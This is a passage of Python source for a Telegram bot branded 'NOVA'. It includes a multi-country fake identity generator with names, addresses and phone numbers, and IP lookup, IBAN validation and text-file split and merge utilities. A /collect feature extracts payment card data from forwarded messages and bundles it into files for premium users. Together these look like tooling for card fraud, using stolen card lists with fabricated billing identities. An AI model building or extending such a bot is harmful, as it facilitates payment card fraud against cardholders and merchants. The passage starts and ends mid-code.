                'Hussain','Abbasi','Hashmi','Mirza','Baig']},
    'BD': {'name':'Bangladesh','phone_code':'+880','len':10,
        'cities':[('Dhaka','Dhaka','1000'),('Chittagong','Chittagong','4000'),('Khulna','Khulna','9000'),
                  ('Rajshahi','Rajshahi','6000'),('Sylhet','Sylhet','3100')],
        'streets':['Gulshan Ave','Banani Road','Dhanmondi','Mirpur Road','Uttara Sector'],
        'first':['Rahim','Karim','Ahmed','Hasan','Rakib','Tanvir','Sabbir','Naim','Fahim','Shakib',
                 'Arif','Sajid','Mahmud','Rifat','Imran','Fatema','Ayesha','Sumaiya','Nusrat'],
        'last':['Islam','Hossain','Ahmed','Rahman','Khan','Chowdhury','Akter','Begum','Sarker',
                'Mia','Sheikh','Talukder']},
    'CN': {'name':'China','phone_code':'+86','len':11,
        'cities':[('Beijing','Beijing','100000'),('Shanghai','Shanghai','200000'),
                  ('Guangzhou','Guangdong','510000'),('Shenzhen','Guangdong','518000'),
                  ('Chengdu','Sichuan','610000')],
        'streets':["Chang'an Ave",'Nanjing Road','Huaihai Road','Zhongshan Road'],
        'first':['Wei','Jun','Ming','Yan','Lei','Hao','Jing','Chen','Bo','Yang','Xin','Feng',
                 'Li','Juan','Mei','Fang','Ying','Xia','Ling','Hong'],
        'last':['Wang','Li','Zhang','Liu','Chen','Yang','Huang','Zhao','Wu','Zhou','Xu','Sun']},
    'JP': {'name':'Japan','phone_code':'+81','len':10,
        'cities':[('Tokyo','Tokyo','100-0001'),('Osaka','Osaka','530-0001'),
                  ('Yokohama','Kanagawa','220-0012'),('Nagoya','Aichi','460-0001'),
                  ('Sapporo','Hokkaido','060-0001')],
        'streets':['Chuo-dori','Ginza','Shibuya','Shinjuku','Umeda'],
        'first':['Haruto','Yuto','Sota','Yuki','Hayato','Ren','Kaito','Riku','Hinata','Yui',
                 'Aoi','Sakura','Rin','Hina','Yuna','Akari','Himari','Ichika','Mei'],
        'last':['Sato','Suzuki','Takahashi','Tanaka','Watanabe','Ito','Yamamoto','Nakamura',
                'Kobayashi','Kato','Yoshida','Yamada']},
    'KR': {'name':'South Korea','phone_code':'+82','len':10,
        'cities':[('Seoul','Seoul','03000'),('Busan','Busan','48000'),('Incheon','Incheon','22000'),
                  ('Daegu','Daegu','41000'),('Daejeon','Daejeon','34000')],
        'streets':['Gangnam-daero','Sejong-daero','Jongno','Myeongdong-gil','Teheran-ro'],
        'first':['Min-jun','Ji-ho','Seo-jun','Do-yun','Ha-jun','Eun-woo','Ji-hu','Jun-seo','Ye-jun',
                 'Seo-yeon','Ji-woo','Ha-eun','Min-seo','Seo-yun','Ji-min','Ye-rin','Soo-ah'],
        'last':['Kim','Lee','Park','Choi','Jung','Kang','Cho','Yoon','Jang','Lim','Han','Oh']},
    'TH': {'name':'Thailand','phone_code':'+66','len':9,
        'cities':[('Bangkok','Bangkok','10100'),('Chiang Mai','Chiang Mai','50000'),
                  ('Pattaya','Chonburi','20150'),('Phuket','Phuket','83000'),('Khon Kaen','Khon Kaen','40000')],
        'streets':['Sukhumvit Rd','Silom Rd','Ratchada Rd','Petchburi Rd','Sathorn Rd'],
        'first':['Somchai','Somsak','Sombat','Prasert','Anan','Niran','Kittisak','Narong','Chai',
                 'Aran','Siriporn','Malee','Pimchan','Nong','Ploy','Fah','Mint','Bua','Dao','Nam'],
        'last':['Srisuk','Wongchai','Saelim','Chaiyasit','Boonmee','Sukhum','Thepsiri','Kittisak',
                'Rattanakorn','Saengthong']},
    'VN': {'name':'Vietnam','phone_code':'+84','len':9,
        'cities':[('Hà Nội','Hà Nội','100000'),('Hồ Chí Minh','HCMC','700000'),
                  ('Đà Nẵng','Đà Nẵng','500000'),('Hải Phòng','Hải Phòng','180000'),('Cần Thơ','Cần Thơ','900000')],
        'streets':['Đường Lê Lợi','Đường Nguyễn Huệ','Đường Trần Hưng Đạo'],
        'first':['Minh','Hùng','Tuấn','Nam','Long','Dũng','Đức','Hải','Khang','Phúc','Anh','Linh',
                 'Mai','Lan','Hương','Ngọc','Thảo','Yến','Nhung','Trang','Hà','Vy'],
        'last':['Nguyễn','Trần','Lê','Phạm','Hoàng','Vũ','Đặng','Bùi','Đỗ','Hồ','Ngô','Dương']},
    'MY': {'name':'Malaysia','phone_code':'+60','len':9,
        'cities':[('Kuala Lumpur','KL','50000'),('Penang','Penang','10000'),('Johor Bahru','Johor','80000'),
                  ('Ipoh','Perak','30000'),('Shah Alam','Selangor','40000')],
        'streets':['Jalan Ampang','Jalan Bukit Bintang','Jalan Tun Razak','Jalan Sultan Ismail'],
        'first':['Ahmad','Muhammad','Aiman','Hakim','Irfan','Danish','Adam','Amir','Daniel','Rayyan',
                 'Aisyah','Nur','Siti','Nadia','Aina','Farah','Hannah','Sarah','Iman','Alia'],
        'last':['Abdullah','Ibrahim','Hassan','Ismail','Yusof','Rahman','Halim','Karim','Razak',
                'Jaafar','Aziz','Rahim']},
    'SG': {'name':'Singapore','phone_code':'+65','len':8,
        'cities':[('Singapore','Central','018956'),('Jurong','West','609390'),
                  ('Woodlands','North','730001'),('Tampines','East','520001'),('Bedok','East','460001')],
        'streets':['Orchard Road','Marina Bay','Bugis Street','Chinatown','Raffles Place'],
        'first':['Wei Ming','Jun Wei','Jia Hui','Kai Wen','Zhi Hao','Jun Jie','Wei Jie','Jun Hao',
                 'Jia Min','Hui Ling','Xin Yi','Wen Xin','Jia Xuan','Wei Ling','Mei Ling'],
        'last':['Tan','Lim','Lee','Ng','Ong','Wong','Chua','Goh','Koh','Teo','Sim','Yeo','Loh']},
    'ID': {'name':'Indonesia','phone_code':'+62','len':10,
        'cities':[('Jakarta','DKI Jakarta','10110'),('Surabaya','Jawa Timur','60111'),
                  ('Bandung','Jawa Barat','40111'),('Medan','Sumatera Utara','20111'),('Semarang','Jawa Tengah','50111')],
        'streets':['Jl. Sudirman','Jl. Thamrin','Jl. Gatot Subroto','Jl. Ahmad Yani'],
        'first':['Budi','Andi','Agus','Dedi','Rudi','Hendra','Joko','Bayu','Fajar','Eko','Rizky',
                 'Dwi','Fitri','Siti','Dewi','Rina','Ayu','Nur','Indah','Maya','Lina','Ratna'],
        'last':['Santoso','Wijaya','Saputra','Susanto','Kurniawan','Hidayat','Nugroho','Setiawan',
                'Pratama','Putra','Utama','Wibowo']},
    'PH': {'name':'Philippines','phone_code':'+63','len':10,
        'cities':[('Manila','Metro Manila','1000'),('Quezon City','Metro Manila','1100'),
                  ('Cebu','Cebu','6000'),('Davao','Davao del Sur','8000'),('Makati','Metro Manila','1200')],
        'streets':['Ayala Ave','EDSA','Roxas Blvd','Ortigas Ave','Katipunan Ave'],
        'first':['Juan','Jose','Antonio','Pedro','Mark','John','Carlo','Miguel','Rafael','Angelo',
                 'Paolo','Rico','Grace','Mary','Angela','Joy','Nicole','Michelle','Stephanie','Anna'],
        'last':['Santos','Reyes','Cruz','Bautista','Ocampo','Garcia','Mendoza','Torres','Flores',
                'Gonzales','Ramos','Aquino']},
    'AE': {'name':'United Arab Emirates','phone_code':'+971','len':9,
        'cities':[('Dubai','Dubai','00000'),('Abu Dhabi','Abu Dhabi','00001'),
                  ('Sharjah','Sharjah','00002'),('Ajman','Ajman','00003'),('Ras Al Khaimah','RAK','00004')],
        'streets':['Sheikh Zayed Road','Jumeirah Beach Road','Al Wasl Road','Al Khaleej Road'],
        'first':['Mohammed','Ahmed','Ali','Omar','Khalid','Saeed','Abdullah','Hamdan','Sultan',
                 'Faisal','Fatima','Aisha','Mariam','Noura','Hessa','Latifa','Salama','Alia'],
        'last':['Al Maktoum','Al Nahyan','Al Falasi','Al Suwaidi','Al Mazrouei','Al Kaabi',
                'Al Hammadi','Al Shamsi','Al Marri','Al Zaabi']},
    'SA': {'name':'Saudi Arabia','phone_code':'+966','len':9,
        'cities':[('Riyadh','Riyadh','11564'),('Jeddah','Makkah','21442'),('Mecca','Makkah','24231'),
                  ('Medina','Madinah','42311'),('Dammam','Eastern','31411')],
        'streets':['King Fahd Road','Olaya Street','Tahlia Street','King Abdullah Road'],
        'first':['Abdullah','Mohammed','Ahmed','Faisal','Khalid','Saud','Sultan','Fahd','Turki',
                 'Noura','Sara','Fatima','Aisha','Hind','Reem','Lama','Maha','Haya'],
        'last':['Al Saud','Al Otaibi','Al Qahtani','Al Harbi','Al Shehri','Al Ghamdi','Al Zahrani',
                'Al Dossari','Al Mutairi','Al Anazi']},
    'TR': {'name':'Turkey','phone_code':'+90','len':10,
        'cities':[('İstanbul','İstanbul','34000'),('Ankara','Ankara','06000'),('İzmir','İzmir','35000'),
                  ('Bursa','Bursa','16000'),('Antalya','Antalya','07000')],
        'streets':['Atatürk Caddesi','İstiklal Caddesi','Cumhuriyet Caddesi','Bağdat Caddesi'],
        'first':['Yusuf','Miraç','Mustafa','Ahmet','Mehmet','Emir','Eren','Kerem','Burak','Onur',
                 'Zeynep','Elif','Defne','Ela','Asya','Nehir','Eylül','Azra','Duru','Derin'],
        'last':['Yılmaz','Kaya','Demir','Şahin','Çelik','Yıldız','Yıldırım','Öztürk','Aydın',
                'Özdemir','Arslan','Doğan']},
    'RU': {'name':'Russia','phone_code':'+7','len':10,
        'cities':[('Moskva','Moscow','101000'),('Sankt-Peterburg','SPb','190000'),
                  ('Novosibirsk','Novosibirsk','630000'),('Yekaterinburg','Sverdlovsk','620000'),('Kazan','Tatarstan','420000')],
        'streets':['ul. Lenina','ul. Pushkina','ul. Gagarina','ul. Mira'],
        'first':['Aleksandr','Sergey','Dmitriy','Andrey','Aleksey','Ivan','Maksim','Mikhail',
                 'Anna','Elena','Olga','Tatiana','Maria','Natalia','Ekaterina','Svetlana','Irina'],
        'last':['Ivanov','Smirnov','Kuznetsov','Popov','Vasiliev','Petrov','Sokolov','Mikhailov',
                'Novikov','Fedorov','Morozov','Volkov']},
    'UA': {'name':'Ukraine','phone_code':'+380','len':9,
        'cities':[('Kyiv','Kyiv','01001'),('Kharkiv','Kharkiv','61001'),('Odesa','Odesa','65001'),
                  ('Dnipro','Dnipro','49000'),('Lviv','Lviv','79000')],
        'streets':['vul. Khreshchatyk','vul. Shevchenka','vul. Franka'],
        'first':['Oleksandr','Andriy','Serhiy','Volodymyr','Dmytro','Ivan','Mykola','Petro',
                 'Oksana','Olena','Kateryna','Mariya','Nataliya','Iryna','Svitlana','Anna'],
        'last':['Shevchenko','Kovalenko','Bondarenko','Tkachenko','Kravchenko','Boyko','Melnyk',
                'Kovalchuk','Shevchuk','Polishchuk','Lysenko']},
    'BR': {'name':'Brazil','phone_code':'+55','len':11,
        'cities':[('São Paulo','SP','01310-100'),('Rio de Janeiro','RJ','20040-020'),
                  ('Brasília','DF','70040-010'),('Salvador','BA','40015-970'),('Fortaleza','CE','60060-170')],
        'streets':['Avenida Paulista','Rua Augusta','Avenida Brasil','Rua XV de Novembro'],
        'first':['João','Pedro','Lucas','Gabriel','Rafael','Mateus','Enzo','Miguel','Arthur','Davi',
                 'Maria','Ana','Beatriz','Júlia','Mariana','Larissa','Camila','Fernanda','Letícia'],
        'last':['Silva','Santos','Oliveira','Souza','Rodrigues','Ferreira','Alves','Pereira','Lima',
                'Gomes','Costa','Ribeiro','Martins']},
    'MX': {'name':'Mexico','phone_code':'+52','len':10,
        'cities':[('Ciudad de México','CDMX','01000'),('Guadalajara','Jalisco','44100'),
                  ('Monterrey','Nuevo León','64000'),('Puebla','Puebla','72000'),('Tijuana','Baja California','22000')],
        'streets':['Avenida Reforma','Calle Madero','Avenida Juárez','Calle Hidalgo'],
        'first':['José','Juan','Miguel','Luis','Carlos','Jesús','Diego','Fernando','Ricardo','Javier',
                 'María','Guadalupe','Sofía','Fernanda','Valeria','Ximena','Regina','Camila'],
        'last':['Hernández','García','Martínez','López','González','Pérez','Rodríguez','Sánchez',
                'Ramírez','Flores','Torres','Rivera']},
    'AR': {'name':'Argentina','phone_code':'+54','len':10,
        'cities':[('Buenos Aires','CABA','C1000'),('Córdoba','Córdoba','X5000'),
                  ('Rosario','Santa Fe','S2000'),('Mendoza','Mendoza','M5500'),('La Plata','Buenos Aires','B1900')],
        'streets':['Avenida 9 de Julio','Avenida Corrientes','Calle Florida','Avenida Santa Fe'],
        'first':['Santiago','Mateo','Juan','Tomás','Benjamín','Facundo','Lautaro','Thiago','Bautista',
                 'Sofía','Valentina','Emma','Martina','Catalina','Julieta','Delfina'],
        'last':['González','Rodríguez','Gómez','Fernández','López','Martínez','Díaz','Pérez','Sosa',
                'Romero','Álvarez','Torres']},
    'CL': {'name':'Chile','phone_code':'+56','len':9,
        'cities':[('Santiago','RM','8320000'),('Valparaíso','Valparaíso','2340000'),
                  ('Concepción','Biobío','4030000'),('La Serena','Coquimbo','1700000'),('Antofagasta','Antofagasta','1240000')],
        'streets':['Avenida Providencia','Avenida Libertador','Calle Ahumada'],
        'first':['Santiago','Mateo','Agustín','Vicente','Benjamín','Martín','Joaquín','Tomás',
                 'Sofía','Emilia','Isidora','Florencia','Catalina','Josefa','Antonia'],
        'last':['González','Muñoz','Rojas','Díaz','Pérez','Soto','Contreras','Silva','Martínez',
                'Sepúlveda','Morales','Rodríguez']},
    'CO': {'name':'Colombia','phone_code':'+57','len':10,
        'cities':[('Bogotá','Cundinamarca','110111'),('Medellín','Antioquia','050001'),
                  ('Cali','Valle del Cauca','760001'),('Barranquilla','Atlántico','080001'),('Cartagena','Bolívar','130001')],
        'streets':['Carrera 7','Avenida Jiménez','Calle 100','Carrera 15'],
        'first':['Santiago','Sebastián','Matías','Alejandro','Daniel','David','Samuel','Nicolás',
                 'Valentina','Isabella','Sofía','Mariana','Salomé','Luciana','Gabriela'],
        'last':['Rodríguez','Martínez','García','López','González','Hernández','Pérez','Ramírez',
                'Torres','Flores','Vargas','Castro']},
    'PE': {'name':'Peru','phone_code':'+51','len':9,
        'cities':[('Lima','Lima','15001'),('Arequipa','Arequipa','04001'),('Trujillo','La Libertad','13001'),
                  ('Chiclayo','Lambayeque','14001'),('Piura','Piura','20001')],
        'streets':['Avenida Arequipa','Jirón de la Unión','Avenida Larco'],
        'first':['Diego','Alejandro','Sebastián','Adriano','Mateo','Luis','Gonzalo','Rodrigo',
                 'Valeria','Camila','Alessandra','Fernanda','Luciana','Fabiana','Micaela'],
        'last':['Quispe','Flores','García','Rodríguez','Vásquez','Rojas','Huamán','Mamani',
                'Chávez','Ramos','Castillo','Sánchez']},
    'ZA': {'name':'South Africa','phone_code':'+27','len':9,
        'cities':[('Johannesburg','Gauteng','2000'),('Cape Town','Western Cape','8000'),
                  ('Durban','KwaZulu-Natal','4000'),('Pretoria','Gauteng','0001'),('Port Elizabeth','Eastern Cape','6001')],
        'streets':['Main Rd','Church St','Long St','Commissioner St','Rivonia Rd'],
        'first':['Johan','Pieter','Jacobus','Thabo','Sipho','David','Andile','Sibusiso','Lwazi',
                 'Themba','Naledi','Zanele','Thandi','Lerato','Ayanda','Nosipho','Precious'],
        'last':['Van der Merwe','Botha','Pretorius','Nkosi','Dlamini','Mokoena','Khumalo','Ndlovu',
                'Zulu','Mahlangu','Mabaso','Sithole']},
    'NG': {'name':'Nigeria','phone_code':'+234','len':10,
        'cities':[('Lagos','Lagos','100001'),('Abuja','FCT','900001'),('Kano','Kano','700001'),
                  ('Ibadan','Oyo','200001'),('Port Harcourt','Rivers','500001')],
        'streets':['Broad Street','Marina','Allen Avenue','Awolowo Road','Ahmadu Bello Way'],
        'first':['Chinedu','Emeka','Adebayo','Oluwaseun','Ifeanyi','Tunde','Chukwuemeka','Uche',
                 'Chiamaka','Adaeze','Ifeoma','Bukola','Folake','Ngozi','Yewande','Amaka'],
        'last':['Okafor','Adeyemi','Okonkwo','Balogun','Nwosu','Adebisi','Obi','Eze','Ogunleye',
                'Afolabi','Ibrahim','Yusuf']},
    'KE': {'name':'Kenya','phone_code':'+254','len':9,
        'cities':[('Nairobi','Nairobi','00100'),('Mombasa','Mombasa','80100'),('Kisumu','Kisumu','40100'),
                  ('Nakuru','Nakuru','20100'),('Eldoret','Uasin Gishu','30100')],
        'streets':['Moi Avenue','Kenyatta Avenue','Haile Selassie Avenue','Ngong Road'],
        'first':['John','Peter','James','David','Michael','Joseph','Brian','Kevin','Daniel','Samuel',
                 'Mary','Grace','Faith','Mercy','Joy','Esther','Wanjiru','Achieng'],
        'last':['Kamau','Otieno','Mwangi','Ochieng','Wanjiru','Njoroge','Kipchoge','Mutua','Omondi',
                'Kariuki','Wafula','Chebet']},
    'EG': {'name':'Egypt','phone_code':'+20','len':10,
        'cities':[('Cairo','Cairo','11511'),('Alexandria','Alexandria','21511'),('Giza','Giza','12511'),
                  ('Shubra El-Kheima','Qalyubia','13711'),('Port Said','Port Said','42511')],
        'streets':['Tahrir Square','Corniche El Nil','Ramses Street','Pyramids Road'],
        'first':['Ahmed','Mohamed','Mahmoud','Omar','Youssef','Ali','Hassan','Mostafa','Karim',
                 'Tamer','Fatima','Aisha','Mariam','Nour','Salma','Yasmin','Hana','Layla'],
        'last':['Hassan','Ibrahim','Ahmed','El-Sayed','Abdel-Rahman','Mahmoud','Mostafa','Fahmy',
                'Sabry','Zaki','Rashad','Farouk']},
    'MA': {'name':'Morocco','phone_code':'+212','len':9,
        'cities':[('Casablanca','Casablanca-Settat','20000'),('Rabat','Rabat-Salé','10000'),
                  ('Fès','Fès-Meknès','30000'),('Marrakech','Marrakech-Safi','40000'),('Tangier','Tanger-Tétouan','90000')],
        'streets':['Boulevard Mohammed V','Avenue Hassan II','Rue Ibn Sina'],
        'first':['Mohamed','Ahmed','Youssef','Omar','Hamza','Mehdi','Anas','Ayoub','Bilal','Karim',
                 'Fatima','Aicha','Khadija','Salma','Imane','Nadia','Sara','Hind'],
        'last':['Alami','Bennani','El Idrissi','Tazi','Fassi','Berrada','Lahlou','Chraibi','Sekkat']},
}


def _fake_resolve(code):
    code = (code or '').strip().upper()
    return code if code in FAKE_DATA else None


def _fake_phone(code):
    d = FAKE_DATA[code]
    n = d['len']
    if code in ('US', 'CA'):
        area = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        mid  = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        last = ''.join(str(random.randint(0, 9)) for _ in range(4))
        return f"({area}) {mid}-{last}"
    digits = ''.join(str(random.randint(0, 9)) for _ in range(n))
    return f"{d['phone_code']} {digits[:n//2]} {digits[n//2:]}"


@client.on(events.NewMessage(pattern=r'^[/.]fake(?:\s+(.+))?$'))
async def cmd_fake(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)

    arg = (event.pattern_match.group(1) or '').strip()

    if not arg or arg.lower() == 'list':
        codes = sorted(FAKE_DATA.keys())
        half = (len(codes) + 1) // 2
        left  = "  ".join(f"<code>{c}</code>" for c in codes[:half])
        right = "  ".join(f"<code>{c}</code>" for c in codes[half:])
        return await styled_reply(event, pe(
            f"🌍 <b>{bs('Fake Identity Generator')}</b>\n{SEP}\n"
            f"✨ {bs('Countries')} (<code>{len(codes)}</code>):\n\n{left}\n{right}\n\n{SEP}\n"
            f"💡 <b>{bs('Usage')}</b>: <code>/fake US</code> · <code>/fake list</code> · <code>/fake random</code>"
        ))

    if arg.lower() == 'random':
        code = random.choice(list(FAKE_DATA.keys()))
    else:
        code = _fake_resolve(arg)
        if not code:
            return await styled_reply(event, pe(
                f"❌ <b>{bs('Unknown country')}</b>: <code>{arg}</code>\n"
                f"💡 {bs('Use')} <code>/fake list</code>"
            ))

    d = FAKE_DATA[code]
    first  = random.choice(d['first'])
    last   = random.choice(d['last'])
    city, state, zip_c = random.choice(d['cities'])
    street = f"{random.choice(d['streets'])} {random.randint(1, 9999)}"
    phone  = _fake_phone(code)

    await styled_reply(event, pe(
        f"👤 <b>{bs('Full Name')}</b> ⌁ <code>{first} {last}</code>\n"
        f"🏠 <b>{bs('Street')}</b> ⌁ <code>{street}</code>\n"
        f"🏙️ <b>{bs('City')}</b> ⌁ <code>{city}</code>\n"
        f"📍 <b>{bs('State')}</b> ⌁ <code>{state}</code>\n"
        f"🌍 <b>{bs('Country')}</b> ⌁ <code>{d['name']}</code>\n"
        f"📮 <b>{bs('Zip')}</b> ⌁ <code>{zip_c}</code>\n"
        f"📞 <b>{bs('Phone')}</b> ⌁ <code>{phone}</code>\n"
        f"{SEP}\n"
        f"💎 <i>{bs('Generated by NOVA')}</i>"
    ))


# ====================== IP / IBAN ======================
@client.on(events.NewMessage(pattern=r'^[/.]ip\s+'))
async def cmd_ip(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/ip 8.8.8.8</code>"))
    ip = parts[1].strip()
    try:
        session = await get_http_session()
        async with session.get(f'http://ip-api.com/json/{ip}',
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            data = await r.json(content_type=None)
        if data.get('status') == 'fail':
            return await styled_reply(event, pe(f"❌ <b>{bs('Invalid IP')}</b>"))
        await styled_reply(event, pe(
            f"🌐 <b>{bs('IP Lookup')}</b>\n{SEP}\n📌 <code>{ip}</code>\n"
            f"🌍 {data.get('country', '-')}\n🏙️ {data.get('city', '-')}\n"
            f"📍 {data.get('regionName', '-')}\n📮 <code>{data.get('zip', '-')}</code>\n"
            f"📊 {data.get('isp', '-')}\n📱 {data.get('mobile', False)}\n"
            f"🏢 {data.get('proxy', False)}\n🗺️ {data.get('lat', '-')}, {data.get('lon', '-')}"
        ))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


def _iban_valid(iban: str) -> bool:
    iban = iban.replace(' ', '').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', iban):
        return False
    rearranged = iban[4:] + iban[:4]
    num = ""
    for ch in rearranged:
        num += ch if ch.isdigit() else str(ord(ch) - 55)
    return int(num) % 97 == 1


@client.on(events.NewMessage(pattern=r'^[/.]iban\s+'))
async def cmd_iban(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/iban GB82WEST12345698765432</code>"))
    iban = parts[1].strip()
    ok = _iban_valid(iban)
    await styled_reply(event, pe(
        f"🏦 <b>{bs('IBAN Validation')}</b>\n{SEP}\n"
        f"📌 <code>{iban}</code>\n✅ {bs('Status')}: {'Valid' if ok else 'Invalid'}"
    ))


# ====================== FILE TOOLS ======================
@client.on(events.NewMessage(pattern=r'^[/.]split(?:\s+(\d+))?$'))
async def cmd_split(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    m = event.pattern_match.group(1)
    chunk_size = 1000
    if m:
        try:
            chunk_size = int(m)
        except ValueError:
            chunk_size = 1000
    if chunk_size < 50: chunk_size = 50
    if chunk_size > 100000: chunk_size = 100000

    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Split')}</b>\n{SEP}\n"
            f"💡 {bs('Reply to a .txt file with')}:\n"
            f"<code>/split 1000</code>\n"
            f"<i>{bs('Default')}: 1000 {bs('lines per file')}</i>"
        ))
    reply = await event.get_reply_message()
    if not reply or not reply.file or not (reply.file.name or '').endswith('.txt'):
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))

    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Splitting')} <code>{chunk_size}</code> {bs('lines per file')}..."
    ))
    path = None
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [ln.rstrip('\n') for ln in (await f.read()).splitlines() if ln.strip()]
    except Exception as e:
        if path and os.path.exists(path):
            try: os.remove(path)
            except Exception: pass
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass

    if not lines:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('File empty')}</b>"))
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    total = len(chunks)
    sent = 0
    for i, ch in enumerate(chunks, 1):
        fname = f"NOVA_split_{i}_{datetime.now().strftime('%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for ln in ch:
                await f.write(ln + "\n")
        try:
            await client_instance.send_file(uid, fname,
                caption=pe(f"📁 {bs('Part')} {i}/{total} · <code>{len(ch)}</code> {bs('lines')}"),
                parse_mode='html')
            sent += 1
        except Exception as e:
            log_system("SPLIT", f"send part {i} failed: {e}", "error")
        try: os.remove(fname)
        except Exception: pass
        if sent % 5 == 0:
            try:
                await status_msg.edit(pe(f"💎 {bs('Splitting')} — <code>{i}/{total}</code>"),
                                      parse_mode='html', link_preview=False)
            except Exception:
                pass
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Split complete')}</b>\n{SEP}\n"
        f"📁 {bs('Total lines')}: <code>{len(lines)}</code>\n"
        f"🧩 {bs('Chunks')}: <code>{total}</code>\n"
        f"📏 {bs('Size')}: <code>{chunk_size}</code> {bs('lines/file')}"
    ))


MERGE_DATA = {}


@client.on(events.NewMessage(pattern=r'^[/.]merge$'))
async def cmd_merge(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if uid in MERGE_DATA:
        return await styled_reply(event, pe(f"💎 {bs('Already active')}"))
    MERGE_DATA[uid] = []
    await styled_reply(event, pe(
        f"💎 <b>{bs('Merge ON')}</b>\n{SEP}\n"
        f"{bs('Send .txt files')}\n{bs('Then')} <code>/donemerge</code>\n"
        f"{bs('Cancel')} <code>/cancelmerge</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]donemerge$'))
async def cmd_donemerge(event):
    uid = event.sender_id
    if uid not in MERGE_DATA:
        return
    files = MERGE_DATA.pop(uid)
    if not files:
        return await styled_reply(event, pe(f"💎 {bs('No files')}"))
    merged_lines = []
    for fp in files:
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                merged_lines.extend(await f.readlines())
            os.remove(fp)
        except Exception:
            pass
    fname = f"NOVA_merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for ln in merged_lines:
            await f.write(ln if ln.endswith("\n") else ln + "\n")
    await client_instance.send_file(uid, fname,
        caption=pe(f"✅ {bs('Merged')} <code>{len(files)}</code> files"), parse_mode='html')
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]cancelmerge$'))
async def cmd_cancelmerge(event):
    uid = event.sender_id
    if uid in MERGE_DATA:
        for fp in MERGE_DATA.pop(uid):
            try: os.remove(fp)
            except Exception: pass
        await styled_reply(event, pe(f"💎 {bs('Cancelled')}"))


@client.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.txt')))
async def merge_listener(event):
    uid = event.sender_id
    if uid not in MERGE_DATA:
        return
    try:
        path = await event.download_media()
        MERGE_DATA[uid].append(path)
        await event.reply(pe(f"✅ {bs('Added')} — <code>{len(MERGE_DATA[uid])}</code>"))
    except Exception:
        pass


COLLECT_DATA = {}


@client.on(events.NewMessage(pattern=r'^[/.]collect$'))
async def cmd_collect(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if uid in COLLECT_DATA:
        return await styled_reply(event, pe(f"💎 {bs('Already active')}"))
    COLLECT_DATA[uid] = []
    await styled_reply(event, pe(
        f"💎 <b>{bs('Collect ON')}</b>\n{SEP}\n"
        f"{bs('Forward messages with cards')}\n{bs('Then')} <code>/donecollect</code>\n"
        f"{bs('Cancel')} <code>/cancelcollect</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]donecollect$'))
async def cmd_donecollect(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA:
        return
    cards = COLLECT_DATA.pop(uid)
    if not cards:
        return await styled_reply(event, pe(f"💎 {bs('No cards')}"))
    fname = f"NOVA_collected_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for c in cards:
            await f.write(c + "\n")
    await client_instance.send_file(uid, fname,
        caption=pe(f"✅ {bs('Collected')} <code>{len(cards)}</code>"), parse_mode='html')
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]cancelcollect$'))
async def cmd_cancelcollect(event):
    COLLECT_DATA.pop(event.sender_id, None)
    await styled_reply(event, pe(f"💎 {bs('Cancelled')}"))


@client.on(events.NewMessage(func=lambda e: e.forward))
async def collect_listener(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA:
        return
    if event.text:
        cards = extract_cc(event.text)
        if cards:
            COLLECT_DATA[uid].extend(cards)
            await event.reply(pe(f"✅ <code>{len(cards)}</code> — {bs('Total')} <code>{len(COLLECT_DATA[uid])}</code>"))
        else:
            await event.reply(pe(f"💎 {bs('No cards')}"))


@client.on(events.NewMessage(pattern=r'^[/.]clean$'))
async def cmd_clean(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
